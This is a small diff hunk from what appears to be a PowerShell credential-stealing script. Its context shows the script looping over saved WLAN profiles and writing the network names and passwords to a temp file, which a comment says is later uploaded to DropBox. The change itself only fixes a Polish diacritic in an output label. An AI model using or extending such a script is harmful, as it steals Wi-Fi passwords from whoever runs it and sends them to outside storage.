@@ -229,7 +229,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 
 	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
 
-	echo "`nZapisane polączenia z internetem: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
+	echo "`nZapisane polaczenia z internetem: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
 
 $content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
 	}
